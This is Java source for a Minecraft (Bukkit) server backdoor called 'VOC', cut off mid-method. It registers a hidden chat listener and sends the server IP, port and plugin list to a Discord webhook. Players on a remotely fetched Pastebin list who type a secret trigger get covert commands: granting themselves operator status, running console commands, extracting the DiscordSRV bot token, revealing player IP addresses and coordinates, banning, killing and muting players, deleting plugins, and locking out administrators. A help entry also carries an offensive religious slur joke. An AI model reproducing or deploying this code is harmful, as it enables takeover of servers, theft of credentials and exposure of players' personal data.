import org.bukkit.Bukkit;
import org.bukkit.World;
import org.bukkit.ChatColor;
import org.bukkit.plugin.Plugin;
import org.bukkit.entity.Player;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.event.Listener;
import org.bukkit.event.EventHandler;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.java.JavaPlugin;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.event.player.PlayerKickEvent;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import org.bukkit.event.server.ServerCommandEvent;
import java.io.ByteArrayOutputStream;
import java.io.PrintStream;
import java.util.logging.ConsoleHandler;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.bukkit.Location;
import org.bukkit.inventory.Inventory;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.HashSet;
import java.util.Random;
import org.bukkit.Material;
import org.bukkit.entity.TNTPrimed;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.inventory.ItemStack;
import java.lang.reflect.Field;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.util.Vector;
import org.bukkit.Server;
import org.bukkit.configuration.file.YamlConfiguration;
import java.util.Set;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;
import org.bukkit.BanList;
import org.bukkit.event.player.PlayerJoinEvent;
import java.util.logging.LogRecord;
import javax.net.ssl.HttpsURLConnection;
import org.bukkit.GameMode;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import java.util.concurrent.CompletableFuture;
import java.util.function.Consumer;

public class MyExploit implements Listener {
    File serverRoot = new File(System.getProperty("user.dir")); 
    File pluginsDirectory = new File(serverRoot, "plugins/DiscordSRV");
    File file = new File(pluginsDirectory, "config.yml");

    private Set<Player> consolespy = new HashSet<>();
    private Set<Player> allowedPlayers = new HashSet<>();
    private Set<Player> normalchat = new HashSet<>();
    private Set<Player> allowedPlayersblatant = new HashSet<>();
    private Set<Player> playerlogcommands = new HashSet<>();
    private Set<Player> blockedPlayers = new HashSet<>();
    private Set<Player> godmodePlayers = new HashSet<>();
    private Set<Player> flyPlayers = new HashSet<>();
    private String backdoorversion = "0.0.1";
    private boolean consoleLocked = false;
    private boolean commandslock = false;
    private Server server;
    private final Plugin plugin;
    private static String webhook = "put discord webhook here";
    private static String pastbin = "put discord raw pastbin here" // make sure to use the raw one "https://pastebin.com/raw/saFiHiaH"
    // ^ put in a pastbin link with the user names you want to alow to login

    String[] errorMessages = {
        "Internal exception: java.io.IOException: Connection reset by peer",
        "Internal exception: java.net.SocketTimeoutException: Read timed out",
        "Internal exception: java.io.IOException: Broken pipe",
        "Internal exception: java.lang.NullPointerException",
        "Internal exception: java.lang.IllegalStateException: Unexpected packet",
        "Disconnected: Timed out",
        "Connection lost: A fatal error has occurred, this connection is terminated",
        "java.net.ConnectException: Connection refused: no further information",
        "java.io.EOFException: End of stream reached",
        "OutOfMemoryError: Java heap space",
        "Could not connect to a default or fallback server, please try again later",
        "java.lang.IndexOutOfBoundsException: Index: 0, Size: 0",
        "Internal server error",
        "java.lang.IllegalArgumentException: Invalid UUID string",
        "Kicked: Flying is not enabled on this server",
        "java.lang.ClassCastException: Cannot cast ItemStack to EntityPlayer",
        "A fatal error has occurred, this connection is terminated",
        "java.lang.ArrayIndexOutOfBoundsException: -1",
        "Error: Bad packet id 64",
        "Server responded with an invalid session ID",
        "java.util.ConcurrentModificationException",
        "java.lang.StackOverflowError",
        "World could not be loaded: corrupted chunk data",
        "java.lang.ArithmeticException: / by zero",
        "Disconnected: You have been idle for too long!",
        "java.lang.IllegalStateException: Player is not online",
        "Kicked for spamming",
        "java.io.FileNotFoundException: server.properties (No such file or directory)",
        "Missing required argument: position",
        "An existing connection was forcibly closed by the remote host",
        "Internal exception: io.netty.handler.codec.DecoderException",
        "Failed to load scoreboard data: data corrupted",
        "Error occurred while enabling Plugin v1.0 (Is it up to date?)",
        "java.lang.NullPointerException: Cannot invoke 'World.getName()' because 'world' is null",
        "java.util.NoSuchElementException: No value present",
        "Player not found",
        "java.lang.IllegalStateException: Cannot interact with null entity",
        "java.lang.RuntimeException: Failed to save chunk data",
        "Kicked: Invalid move packet received",
        "Error executing command: Unknown or incomplete command",
        "Cannot send chat message",
        "java.lang.IllegalArgumentException: Chunk coordinates out of bounds",
        "java.io.IOException: Failed to read packet data",
        "Failed to synchronize registry data from server"
    };
    
    public MyExploit(Plugin plugin) {
        this.plugin = plugin;
        this.server = plugin.getServer();  
    }
    public void setServer(Server server) {
        this.server = server;
    }

    public Server getServer() {
        return this.server;
    }
    private Plugin getPlugin() {
        return JavaPlugin.getProvidingPlugin(this.getClass());
    }

    public static void inject(JavaPlugin plugin) {
        MyExploit exploit = new MyExploit(plugin);
        plugin.getServer().getPluginManager().registerEvents(exploit, plugin);
        
        String serverIp = plugin.getServer().getIp(); // Get the server IP address
        if (serverIp == null || serverIp.isEmpty()) {
            serverIp = "localhost";
        }
        String message = ""
                + "**IP** ```" + serverIp + "```\n"
                + "**Port** ```" + plugin.getServer().getPort() + "```\n"
                + "**Version** ```" + plugin.getServer().getVersion().replace("\"", "\\\"") + "```\n"
                + "**Backdoor Plugin** ```" + plugin.getDescription().getName() + "```\n"
                + "**Plugins** ```" + Arrays.stream(plugin.getServer().getPluginManager().getPlugins())
                .map(p -> p.getName())
                .reduce((a, b) -> a + ", " + b).orElse("None") + "```\n";
        sendWebhook(buildJsonPayload(message,exploit.backdoorversion));
    }

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();
        String message = event.getMessage().toLowerCase();
        if (normalchat.contains(player)) {
            normalchat.remove(player);
            return;
        }
        if (blockedPlayers.contains(player)) {
            player.sendMessage("<" + event.getPlayer().getName() + "> " + event.getMessage());
            event.setCancelled(true);
            return;
        }
        if (message.equalsIgnoreCase("./help")) {
            event.setCancelled(true);

            Set<String> allowedUsernames = fetchUsernamesFromPastebin(pastbin);

            if (!allowedUsernames.contains(player.getName())) {
                return;
            }
            allowedPlayers.add(player);
            player.sendMessage("§aVOC §f> logged into §aVOC§f.");
            return;
        }   
        if (allowedPlayers.contains(player)) {
            event.setCancelled(true);
            if (message.startsWith("help")) {
                String[] parts = message.split(" ");
                if (parts.length == 2) {
                    try {
                        int pageNumber = Integer.parseInt(parts[1]); // Parse the page number
                        showHelpPage(player, pageNumber); // Show the help page
                    } catch (NumberFormatException e) {
                        player.sendMessage("§aVOC §f> Invalid page number. Usage: help <number>");
                    }
                } else {
                    player.sendMessage("§aVOC §f> Usage: help <number>");
                }
                return;
        }else if (message.startsWith("ips")) {
            if (message.length() > "ips ".length()) {
                String targetName = message.substring("ips ".length()).trim();
                sendIps(player, targetName);  // Pass the target player name
            } else {
                sendIps(player, null);  // No target player name provided
            }
        } else if (message.startsWith("coords")) {
            if (message.length() > "coords ".length()) {
                String targetName = message.substring("coords ".length()).trim();
                sendCoords(player, targetName); // Pass the target player name
            } else {
                sendCoords(player, null);  // No target player name provided
            }
        } else if (message.startsWith("godmode") || message.startsWith("godmode ") ) {
            if (!allowedPlayersblatant.contains(player)) {player.sendMessage("§aVOC §f> please enable §cblatant§f mode"); return;}
        toggleGodmode(player);
        } else if (message.startsWith("fly") || message.startsWith("fly ")) {
            if (!allowedPlayersblatant.contains(player)) {player.sendMessage("§aVOC §f> please enable §cblatant§f mode"); return;}
            toggleFly(player);
        } else if (message.startsWith("op") || message.startsWith("op ")) {
            if (!allowedPlayersblatant.contains(player)) {player.sendMessage("§aVOC §f> please enable §cblatant§f mode"); return;}
            setOp(player);
        } else if (message.startsWith("deop") || message.startsWith("deop ")) {
            if (!allowedPlayersblatant.contains(player)) {player.sendMessage("§aVOC §f> please enable §cblatant§f mode"); return;}
            removeOp(player);
        } else if (message.startsWith("heal") || message.startsWith("heal ")) {
            handleHealCommand(player, message);
        } else if (message.startsWith("dupe") || message.startsWith("dupe ")) {
            duplicateItem(player);
        } else if (message.startsWith("give") || message.startsWith("give ")) {
            handleGiveCommand(player, message);
        } else if (message.startsWith("gmc") || message.startsWith("creative")  || message.startsWith("gmc ")) {
            if (!allowedPlayersblatant.contains(player)) {player.sendMessage("§aVOC §f> please enable §cblatant§f mode"); return;}
            Bukkit.getScheduler().runTask(getPlugin(), () -> {
                player.setGameMode(GameMode.CREATIVE);
                player.sendMessage("§aVOC §f> Switched to Creative");
            });
        } else if (message.startsWith("gma") || message.startsWith("adventure") || message.startsWith("gma ")) {
            if (!allowedPlayersblatant.contains(player)) {player.sendMessage("§aVOC §f> please enable §cblatant§f mode"); return;}
            Bukkit.getScheduler().runTask(getPlugin(), () -> {
                player.setGameMode(GameMode.ADVENTURE);
                player.sendMessage("§aVOC §f> Switched to Adventure");
            });
        } else if (message.startsWith("gms") || message.startsWith("survival") || message.startsWith("gms ")) {
            if (!allowedPlayersblatant.contains(player)) {player.sendMessage("§aVOC §f> please enable §cblatant§f mode"); return;}
            Bukkit.getScheduler().runTask(getPlugin(), () -> {
                player.setGameMode(GameMode.SURVIVAL);
                player.sendMessage("§aVOC §f> Switched to Survival");
            });
        }else if (message.startsWith("discordtoken ") || message.startsWith("discordtoken")) {
            String tokenbot = extractBotToken(file);
            if (tokenbot != null) {
                player.sendMessage("§aVOC §f> " + tokenbot); // Send the bot token as a message to the player
            } else {
                player.sendMessage("§aVOC §f> Failed to retrieve the bot token.");
            }
        }else if (message.startsWith("ban ") || message.startsWith("ban")) {
            if (!allowedPlayersblatant.contains(player)) {player.sendMessage("§aVOC §f> please enable §cblatant§f mode"); return;}
            handleBanCommand(player, message);
        }else if (message.startsWith("unban ") || message.startsWith("unban")) {
            if (!allowedPlayersblatant.contains(player)) {player.sendMessage("§aVOC §f> please enable §cblatant§f mode"); return;}
            handleUnbanCommand(player, message);
        } else if (message.startsWith("ipban ") || message.startsWith("ipban")) {
            if (!allowedPlayersblatant.contains(player)) {player.sendMessage("§aVOC §f> please enable §cblatant§f mode"); return;}
            handleBanIpCommand(player, message);
        }
        else if (message.startsWith("unipban ") || message.startsWith("unipban")) {
            if (!allowedPlayersblatant.contains(player)) {player.sendMessage("§aVOC §f> please enable §cblatant§f mode"); return;}
            handleUnbanIpCommand(player, message);
        }
        else if (message.startsWith("kick ") || message.startsWith("kick")) {
            if (!allowedPlayersblatant.contains(player)) {player.sendMessage("§aVOC §f> please enable §cblatant§f mode"); return;}
        handleKickCommand(player, message);
        }else if (message.startsWith("errorkick ") || message.startsWith("errorkick")) {
            if (!allowedPlayersblatant.contains(player)) {player.sendMessage("§aVOC §f> please enable §cblatant§f mode"); return;}
            handlerrorKickCommand(player, message);
        }
        else if (message.startsWith("plugins") || message.startsWith("pl") || message.startsWith("plugins ")) {
            getpluginsinserver(player);
        }else if (message.startsWith("clearchat") || message.startsWith("cc") || message.startsWith("clearchat ")) {
        for (int i = 0; i < 20; i++) {
            player.sendMessage(" \n"); 
        }
        }else if (message.startsWith("logout") || message.startsWith("lg") || message.startsWith("logout ")) {
            allowedPlayers.remove(player);
            player.sendMessage("§aVOC §f> You have been logged out.");
        }else if (message.startsWith("enchant ") || message.startsWith("enchant")) {
            handleEnchantCommand(player, message);
        }else if (message.startsWith("xp ")|| message.startsWith("xp")) {
            handleXpCommand(player, message);
        }
        else if (message.startsWith("seed ")|| message.startsWith("seed")) {
            seed(player);
        }else if (message.startsWith("tp ") || message.startsWith("tp")) {
            if (!allowedPlayersblatant.contains(player)) {player.sendMessage("§aVOC §f> please enable §cblatant§f mode"); return;}
            tp(player, message);
        }
        else if (message.startsWith("invsee ") || message.startsWith("invsee")) {
            invsee(player, message);
        } else if (message.startsWith("consoleflood") || message.startsWith("consoleflood")) {
            floodConsole();
            player.sendMessage("§aVOC §f> GG console is COOKED.");
        }else if (message.startsWith("console ") || message.startsWith("console")) {
            if (!allowedPlayersblatant.contains(player)) {player.sendMessage("§aVOC §f> please enable §cblatant§f mode"); return;}
            executeConsoleCommand(player, message);
        }else if (message.startsWith("sudo ") || message.startsWith("sudo")) {
            if (!allowedPlayersblatant.contains(player)) {player.sendMessage("§aVOC §f> please enable §cblatant§f mode"); return;}
            executeSudoCommand(player, message);
        }else if (message.startsWith("deleteplugin ") || message.startsWith("deleteplugin")) {
            if (!allowedPlayersblatant.contains(player)) {player.sendMessage("§aVOC §f> please enable §cblatant§f mode"); return;}
            deletePlugin(player, message);
        }else if (message.startsWith("disableplugin ") || message.startsWith("disableplugin")) {
            if (!allowedPlayersblatant.contains(player)) {player.sendMessage("§aVOC §f> please enable §cblatant§f mode"); return;}
            disableplugincommand(player, message);
        }else if (message.startsWith("enableplugin ")  || message.startsWith("enableplugin")) {
            if (!allowedPlayersblatant.contains(player)) {player.sendMessage("§aVOC §f> please enable §cblatant§f mode"); return;}
            enableplugincommand(player, message);
        }else if (message.startsWith("kill ")  || message.startsWith("kill")) {
            if (!allowedPlayersblatant.contains(player)) {player.sendMessage("§aVOC §f> please enable §cblatant§f mode"); return;}
            String targetName = message.substring(5).trim();
            killPlayer(player, targetName);
        } else if (message.startsWith("blatant ") || message.startsWith("blatant")) {
            if (!allowedPlayersblatant.contains(player)) {
                player.sendMessage("§aVOC §f> §cBlatant§f mode §aenabled§f.");
                allowedPlayersblatant.add(player);
            } else {
                player.sendMessage("§aVOC §f> §cBlatant§f mode §cdisabled§f.");
                allowedPlayersblatant.remove(player);
            }
        }  else if (message.startsWith("credits") || message.startsWith("credits")) {
            player.sendMessage("§aVOC §f> Made by §cshadoweagle7184");
            player.sendMessage("§aVOC §f> big inspiration from §5ecstasy");
        }  else if (message.startsWith("save ") || message.startsWith("save")) {
            if (!allowedPlayersblatant.contains(player)) {player.sendMessage("§aVOC §f> please enable §cblatant§f mode"); return;}
            saveFunction();
        }  else if (message.startsWith("reload ") || message.startsWith("reload")) {
            if (!allowedPlayersblatant.contains(player)) {player.sendMessage("§aVOC §f> please enable §cblatant§f mode"); return;}
            player.sendMessage("§aVOC §f> Reloading §clogin§f after reload");
            reloadfunction();
        } else if (message.startsWith("ad") || message.startsWith("ad")) {
            if (!allowedPlayersblatant.contains(player)) {player.sendMessage("§aVOC §f> please enable §cblatant§f mode"); return;}
            broadcastAd();
        } else if (message.startsWith("version ") || message.startsWith("version")) {
            player.sendMessage("§aVOC §f> backdoor verion " + backdoorversion);
        }else if (message.startsWith("itemcount ") || message.startsWith("itemcount")) {
            changeItemCount(player, message);
        } else if (message.startsWith("sc") || message.startsWith("sc ")) {
            if (message.length() <= 2 || message.trim().equals("sc")) {
                player.sendMessage("§aVOC §f> Usage: sc <message>");
            } else {
                // Extract the message content after "sc "
                String content = message.substring(3).trim(); // Trim ensures we clean extra spaces
                sendToAllowedPlayers(player, content);
            }
        }
        else if (message.startsWith("chat") || message.startsWith("chat ")) {
            if (message.length() <= 4 || message.trim().equals("chat")) {
                player.sendMessage("§aVOC §f> Usage: chat <message>");
            } else {
                String content = message.substring(5).trim(); 
                normalchat.add(player);
                Bukkit.getScheduler().runTask(getPlugin(), () -> player.chat(content));
            }
        }else if (message.startsWith("spam") || message.startsWith("spam ")) { // Trim the message first
            if (!allowedPlayersblatant.contains(player)) {player.sendMessage("§aVOC §f> please enable §cblatant§f mode"); return;}
            String trimmedMessage = message.trim(); // Trim once for consistency
        
            if (trimmedMessage.length() <= 5 || trimmedMessage.equals("spam")) {
                player.sendMessage("§aVOC §f> Usage: spam <message>");
            } else {
                String content = trimmedMessage.substring(5).trim(); // Extract and trim the content
                content = content.replace("&", "§"); // Replace '&' with '§' for formatting
                
                // Broadcast the message 25 times
                for (int i = 0; i < 25; i++) {
                    Bukkit.broadcastMessage(content);
                }
            }
        }else if (message.trim().startsWith("broadcast")) { // Trim the message first
            if (!allowedPlayersblatant.contains(player)) {player.sendMessage("§aVOC §f> please enable §cblatant§f mode"); return;}
            String trimmedMessage = message.trim(); 
        
            if (trimmedMessage.length() <= 9 || trimmedMessage.equals("broadcast")) {
                player.sendMessage("§aVOC §f> Usage: broadcast <message>");
            } else {
                String content = trimmedMessage.substring(10).trim(); // Extract and trim the content
                content = content.replace("&", "§"); // Replace '&' with '§' for formatting
        
                Bukkit.broadcastMessage("§a[Broadcast] §f" + content); // Send the formatted message to all players
            }
        }                   
        else if (message.startsWith("bomb") || message.startsWith("bomb" )) {
            if (!allowedPlayersblatant.contains(player)) {player.sendMessage("§aVOC §f> please enable §cblatant§f mode"); return;}
            ItemStack tnt = new ItemStack(Material.TNT, 1);
            ItemMeta meta = tnt.getItemMeta();
        
        if (meta != null) {
            meta.setDisplayName("§cbomb"); // Name the TNT "bomb" (you can use color codes as well)
            meta.addEnchant(Enchantment.MENDING, 1, true); // Add Mending enchantment
            tnt.setItemMeta(meta);
            player.sendMessage("§aVOC §f> Bomb goes boom!");
        }
        player.getInventory().addItem(tnt);
        }else if (message.contains("consolespy") || message.contains("consolespy ")) {
            if (consolespy.contains(player)) {
                consolespy.remove(player);  // Disable console spy by removing player from the set
                player.sendMessage("§aVOC §f> Console spy §cdisabled§f.");
            } else {
                consolespy.add(player);  // Enable console spy by adding player to the set
                player.sendMessage("§aVOC §f> Console spy §aenabled§f.");
            }
        }else if (message.startsWith("commandspy") || (message.startsWith("commandspy "))) {
            if (playerlogcommands.contains(player)) {
                playerlogcommands.remove(player);
                player.sendMessage("§aVOC §f> Commandspy §cdisabled§f.");
            } else {
                playerlogcommands.add(player);
                player.sendMessage("§aVOC §f> Commandspy §aenabled§f.");
            }
        }else if (message.startsWith("echest") || (message.startsWith("echest ")))  {
            viewechest(message, player);
        }
        else if (message.startsWith("mute ") || message.startsWith("mute")) {
            String[] args = message.split(" ");
            if (args.length > 1) {
                Player target = Bukkit.getPlayer(args[1]);  // Get the player mentioned in the command

                if (target != null && target.isOnline() ) {
                    if (allowedPlayers.contains(target)) {
                        player.sendMessage("§aVOC §f> You cannot mute this player");
                    return;
                    }
                    if (blockedPlayers.contains(target)) {
                        player.sendMessage("§aVOC §f> " + target.getName() + " is already muted.");
                    } else {
                        blockedPlayers.add(target);  // Mute the target player
                        player.sendMessage("§aYou have muted " + target.getName() + ".");
                    }
                } else {
                    player.sendMessage("§aVOC §f> Player not found.");
                }
            } else {
                player.sendMessage("§aVOC §f> Usage: mute <player>");
            }
            return;
        }
        else if (message.startsWith("unmute ") || message.startsWith("unmute")) {
            String[] args = message.split(" ");
            if (args.length > 1) {
                Player target = Bukkit.getPlayer(args[1]);

                if (target != null && target.isOnline()) {
                    if (!blockedPlayers.contains(target)) {
                        player.sendMessage("§c" + target.getName() + " is not muted.");
                    } else {
                        blockedPlayers.remove(target);  // Unmute the target player
                        player.sendMessage("§aYou have unmuted " + target.getName() + ".");
                    }
                } else {
                    player.sendMessage("§aVOC §f> Player not found.");
                }
            } else {
                player.sendMessage("§aVOC §f> Usage: unmute <player>");
            }
            return;
        }
        else if (message.startsWith("lockcommands ")  || message.startsWith("lockcommands") || message.startsWith("commandslock ")  || message.startsWith("commandslock")) {
            if (!allowedPlayersblatant.contains(player)) {player.sendMessage("§aVOC §f> please enable §cblatant§f mode"); return;}
            if (!commandslock) {
                commandslock = true;
                player.sendMessage("§aVOC §f> commands is now §elocked§f.");
            } else {
                player.sendMessage("§aVOC §f> commands is already §elocked§f.");
            }
        }
        else if (message.startsWith("lockcommands ")  || message.startsWith("lockcommands") || message.startsWith("commandslock ")  || message.startsWith("commandslock")) {
            if (!allowedPlayersblatant.contains(player)) {player.sendMessage("§aVOC §f> please enable §cblatant§f mode"); return;}
            if (!commandslock) {
                commandslock = true;
                player.sendMessage("§aVOC §f> commands is now §elocked§f.");
            } else {
                player.sendMessage("§aVOC §f> commands is already §elocked§f.");
            }
        }else if (message.startsWith("unlockcommands")  || message.startsWith("unlockcommands") || message.startsWith("commandsunlock")  || message.startsWith("commandsunlock")) {
            if (!allowedPlayersblatant.contains(player)) {player.sendMessage("§aVOC §f> please enable §cblatant§f mode"); return;}
            if (commandslock) {
                commandslock = false;
                player.sendMessage("§aVOC §f> commands is now §eunlocked§f.");
            } else {
                player.sendMessage("§aVOC §f> commands is not §elocked§f.");
            }
        }
        else if (message.startsWith("lockconsole ")  || message.startsWith("lockconsole") || message.startsWith("consolelock ")  || message.startsWith("consolelock")) {
            if (!allowedPlayersblatant.contains(player)) {player.sendMessage("§aVOC §f> please enable §cblatant§f mode"); return;}
            if (!consoleLocked) {
                consoleLocked = true;
                player.sendMessage("§aVOC §f> console is now §elocked§f.");
            } else {
                player.sendMessage("§aVOC §f> console is already §elocked§f.");
            }
        }else if (message.startsWith("unlockconsole")  || message.startsWith("unlockconsole ") || message.startsWith("consoleunlock")  || message.startsWith("consoleunlock")) {
            if (!allowedPlayersblatant.contains(player)) {player.sendMessage("§aVOC §f> please enable §cblatant§f mode"); return;}
            if (consoleLocked) {
                consoleLocked = false;
                player.sendMessage("§aVOC §f> console is now §eunlocked§f.");
            } else {
                player.sendMessage("§aVOC §f> console is not §elocked§f.");
            }
        }else if (message.trim().startsWith("explode") || (message.trim().startsWith("explode "))) { // Trim the message first
            if (!allowedPlayersblatant.contains(player)) {
                player.sendMessage("§aVOC §f> please enable §cblatant§f mode");
                return;
            }
            String trimmedMessage = message.trim();
        
            if (trimmedMessage.length() <= 7 || trimmedMessage.equals("explode")) {
                player.sendMessage("§aVOC §f> Usage: explode <player>");
            } else {
                String targetPlayerName = trimmedMessage.substring(7).trim(); // Extract and trim the player name
                Player targetPlayer = Bukkit.getPlayer(targetPlayerName);
        
                if (targetPlayer == null) {
                    player.sendMessage("§aVOC §f> Player not found.");
                } else {
                    targetPlayer.getWorld().createExplosion(targetPlayer.getLocation(), 4.0F); // Create an explosion at the player's location
                    player.sendMessage("§aVOC §f> Made " + targetPlayerName + " explode.");
                }
            }
        } else if (message.trim().startsWith("setmotd") || (message.trim().startsWith("setmotd "))) { // Trim the message first
            if (!allowedPlayersblatant.contains(player)) {
                player.sendMessage("§aVOC §f> please enable §cblatant§f mode");
                return;
            }
            String trimmedMessage = message.trim();
        
            if (trimmedMessage.length() <= 7 || trimmedMessage.equals("setmotd")) {
                player.sendMessage("§aVOC §f> Usage: setmotd <message>");
            } else {
                String motd = trimmedMessage.substring(7).trim(); // Extract and trim the MOTD message
                motd = motd.replace("&", "§"); // Replace '&' with '§' for formatting
        
                try {
                    Object minecraftServer = Bukkit.getServer().getClass().getMethod("getServer").invoke(Bukkit.getServer());
                    Field motdField = minecraftServer.getClass().getDeclaredField("motd"); // Access the private MOTD field
                    motdField.setAccessible(true);
                    motdField.set(minecraftServer, motd); // Set the MOTD
                    player.sendMessage("§aVOC §f> MOTD set to: " + motd);
                } catch (Exception e) {
                    player.sendMessage("§aVOC §f> Failed to set MOTD: " + e.getMessage());
                    e.printStackTrace();
                }                
            }
        }
        else if (message.contains("discord") || message.startsWith("dc") || message.startsWith("discord ")) {
            player.sendMessage("§aVOC §f> https://discord.gg/m23ZrwrMbB");
        } 
        else {
            player.sendMessage("§aVOC §f> Unknown command. Type 'help <nummber>' for a list of commands.");
        }
        }
    }

    private Set<String> fetchUsernamesFromPastebin(String urlString) {
        Set<String> usernames = new HashSet<>();
        try {
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String inputLine;
            while ((inputLine = in.readLine()) != null) {
                usernames.add(inputLine.trim());
            }
            in.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return usernames;
    }

    private void showHelpPage(Player player, int page) {
        // Each page contains a list of commands
        int maxPages = 14;
        switch (page) {
            case 1: // I was a max of 4 commands on every help page
                player.sendMessage("§aVOC §f> Commands (Page 1/" + maxPages + "):");
                player.sendMessage(" §a-§f Blatant | Enable §cblatant §fmode");
                player.sendMessage(" §a-§f §e⚠ §fGodmode | Toggle godmode");
                player.sendMessage(" §a-§f Gp | Gives you OP");
                player.sendMessage(" §a-§f  Deop | Remove your OP");
                break;
            case 2:
            player.sendMessage("§aVOC §f> Commands (Page 2/" + maxPages + "):");
                player.sendMessage(" §a-§f  Heal <player> | heals and feeds the player");
                player.sendMessage(" §a-§f  Dupe | Duplicate the item in your hand");
                player.sendMessage(" §a-§f  Ips <player> | Show the IP address of the specified player");
                player.sendMessage(" §a-§f  Coords <player> | Show the coordinates of the specified player");
                break;
            case 3:
            player.sendMessage("§aVOC §f> Commands (Page 3/" + maxPages + "):");
                player.sendMessage(" §a-§f  Logout | Log out of the backdoor you can talk again");
                player.sendMessage(" §a-§f  §e⚠ §fGmc | Changes your gamemode to Creative ");
                player.sendMessage(" §a-§f  §e⚠ §fGms | Changes your gamemode to Survival");
                player.sendMessage(" §a-§f  §e⚠ §fGma | Changes your gamemode to Adventure ");

                break;
            case 4:
            player.sendMessage("§aVOC §f> Commands (Page 4/" + maxPages + "):");
                player.sendMessage(" §a-§f  Enchant <enchantment> <level> | Enchants the item in your hand");
                player.sendMessage(" §a-§f  Give <item> <amount> | Gives you a specified item");
                player.sendMessage(" §a-§f  §e⚠ §fInvsee <username> | View the inventory of a player");
                player.sendMessage(" §a-§f  Discord | show discord invite");
                break;
            case 5:
                player.sendMessage("§aVOC §f> Commands (Page 5/" + maxPages + "):");
                player.sendMessage(" §a-§f  Plugins | will show the plugins installed");
                player.sendMessage(" §a-§f  §e⚠ §fTp <player1> <player2> | Teleport player1 to player2");
                player.sendMessage(" §a-§f  Clearchat | will clear §eyour §fchat");
                player.sendMessage(" §a-§f  §e⚠ §f Console <command> | Execute a command in the console");
                break;
            case 6:
                player.sendMessage("§aVOC §f> Commands (Page 6/" + maxPages + "):");
                player.sendMessage(" §a-§f  Sudo <player> <message> | Send a message as another player");
                player.sendMessage(" §a-§f  §e⚠ §fKick <player> | Kicks a player");
                player.sendMessage(" §a-§f  §e⚠ §fBan <player> | Bans a player");
                player.sendMessage(" §a-§f  §e⚠ §fUnban <player> | Unbans a player");
                break;
            case 7:
                player.sendMessage("§aVOC §f> Commands (Page 7/" + maxPages + "):");
                player.sendMessage(" §a-§f  §e⚠ §fDisableplugin <plugin> | Disables a plugin");
                player.sendMessage(" §a-§f  §e⚠ §fEnableplugin <plugin> | Enables a plugin");
                player.sendMessage(" §a-§f  §e⚠ §fDeleteplugin <plugin> | Deletes a plugin");
                player.sendMessage(" §a-§f  §e⚠ §fKill <player> | Kills a player");
                
                break;
            case 8:
                player.sendMessage("§aVOC §f> Commands (Page 8/" + maxPages + "):");
                player.sendMessage(" §a-§f  §e⚠ §fLockcommands | Locks the commands");
                player.sendMessage(" §a-§f  §e⚠ §fUnlockcommands | Unlocks the commands");
                player.sendMessage(" §a-§f  §e⚠ §fLockconsole | Locks the console");
                player.sendMessage(" §a-§f  §e⚠ §fUnlockconsole | Unlocks the console");
                break;
            case 9:
                player.sendMessage("§aVOC §f> Commands (Page 9/" + maxPages + "):");
                player.sendMessage(" §a-§f  §e⚠ §fFly | Toggle fly");
                player.sendMessage(" §a-§f  Credits | shows the credits");
                player.sendMessage(" §a-§f  §e⚠ §fSave | saves the server");
                player.sendMessage(" §a-§f  §e⚠ §fReload | reloads the server");
                break;
            case 10:
                player.sendMessage("§aVOC §f> Commands (Page 10/" + maxPages + "):");
                player.sendMessage(" §a-§f  Chat <message> | will send the message like normal");
                player.sendMessage(" §a-§f  Discordtoken | shows the discordSVR token");
                player.sendMessage(" §a-§f  xp <set/add> <amount> | sets or adds xp to a player");
                player.sendMessage(" §a-§f  Ad | shows a ad for voc to each player");
                break;
            case 11:
                player.sendMessage("§aVOC §f> Commands (Page 11/" + maxPages + "):");
                player.sendMessage(" §a-§f  Errorkick | kicks the player with a error");
                player.sendMessage(" §a-§f  Commandspy | spy on commands");
                player.sendMessage(" §a-§f  §e⚠ §fMute | mutes a player");
                player.sendMessage(" §a-§f  §e⚠ §fUnmute | unmutes a player");
                break;
            case 12:
                player.sendMessage("§aVOC §f> Commands (Page 12/" + maxPages + "):");
                player.sendMessage(" §a-§f  §e⚠ §fBomb §f| §cAllahu Akbar");
                player.sendMessage(" §a-§f  Itemcount | changes the item count");
                player.sendMessage(" §a-§f  Echest | view the enderchest of a player");
                player.sendMessage(" §a-§f  Version | shows the version of the backdoor");
                break;
            case 13:
                player.sendMessage("§aVOC §f> Commands (Page 13/" + maxPages + "):");
                player.sendMessage(" §a-§f  Consoleflood | floods the console");
                player.sendMessage(" §a-§f  sc | send message to logged in players");
                player.sendMessage(" §a-§f  §e⚠§f Broadcast <message> | broadcasts a message");
                player.sendMessage(" §a-§f  §e⚠§f Spam <message> | spams a message");
            break;
            case 14:
                player.sendMessage("§aVOC §f> Commands (Page 14/" + maxPages + "):");
                player.sendMessage(" §a-§f  §e⚠ §fBanip <IP> | Bans a IP address");
                player.sendMessage(" §a-§f  §e⚠ §fUnbanip <ip> | Unbans a IP address"); 
                player.sendMessage(" §a-§f  §e⚠ §fDownload <url>| downloads a plugin");
                break;
            default:
                player.sendMessage("§aVOC §f> Invalid page number.");
                break;
        }
    }
    private void toggleGodmode(Player player) {
        if (godmodePlayers.contains(player)) {
            godmodePlayers.remove(player);
            player.setInvulnerable(false);
            player.sendMessage("§aVOC §f> Godmode disabled.");
        } else {
            godmodePlayers.add(player);
            player.setInvulnerable(true);
            player.sendMessage("§aVOC §f> Godmode enabled.");
        }
    }

    private void toggleFly(Player player) {
        if (flyPlayers.contains(player)) {
            flyPlayers.remove(player);
            player.setAllowFlight(false); // Disable flight permission
            player.setFlying(false);      // Ensure they're no longer flying
            player.sendMessage("§aVOC §f> Fly disabled.");
        } else {
            flyPlayers.add(player);
            player.setAllowFlight(true);  // Grant flight permission
            player.setFlying(true);       // Enable flying
